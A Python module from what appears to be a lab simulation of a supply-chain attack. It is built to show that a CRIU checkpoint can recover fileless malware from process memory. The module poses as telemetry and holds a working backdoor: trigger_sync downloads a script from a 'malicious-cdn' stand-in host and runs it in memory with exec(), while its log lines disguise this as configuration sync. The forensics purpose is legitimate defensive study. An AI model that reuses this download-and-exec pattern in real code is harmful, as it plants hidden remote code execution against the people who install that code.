#!/usr/bin/env python3
"""
Telemetry Module - Metrics Collection Utilities
(This is actually a malicious module disguised as telemetry)

SUPPLY CHAIN ATTACK SIMULATION:
This module was injected into the application during the build process.
It masquerades as a legitimate telemetry/metrics utility but actually:
1. Downloads a malicious script from an attacker-controlled server
2. Executes the script entirely in memory (never writes to disk)

The fileless execution means:
- No file on disk to scan
- No file hash to detect
- Traditional forensics won't find it
- BUT: CRIU checkpoint captures the script from process memory!
"""
import os
import sys
import time
import urllib.request

# Configuration disguised as telemetry endpoints
TELEMETRY_ENDPOINT = "http://payload-server.malicious-cdn.svc.cluster.local:8080"
METRICS_PATH = "/payload"

def log(msg):
    """Log messages to stderr"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] [telemetry] {msg}", file=sys.stderr)

def trigger_sync():
    """
    Called when the backdoor is triggered.
    Downloads and executes malicious script entirely in memory.
    """
    log("Debug sync initiated...")
    log(f"PID: {os.getpid()}")

    # The URL looks like a metrics endpoint but serves malicious code
    payload_url = f"{TELEMETRY_ENDPOINT}{METRICS_PATH}"

    try:
        log(f"Fetching configuration from {payload_url}...")

        # Download the script
        req = urllib.request.Request(payload_url)
        with urllib.request.urlopen(req, timeout=30) as response:
            # Read the script into memory - never written to disk
            script_content = response.read().decode('utf-8')

            log(f"Received {len(script_content)} bytes of configuration data")

            # ================================================================
            # FILELESS EXECUTION
            # The script is executed directly from memory using exec()
            # This is the key technique:
            # - script_content is a Python string in memory
            # - exec() compiles and runs it without touching disk
            # - CRIU will capture this string from process memory
            # ================================================================

            log("Processing configuration...")

            # Execute the downloaded script in memory
            # The script content lives only in the 'script_content' variable
            # and in the Python interpreter's compiled bytecode
            exec(script_content, {'__name__': '__main__'})

    except Exception as e:
        log(f"Sync failed: {e}")
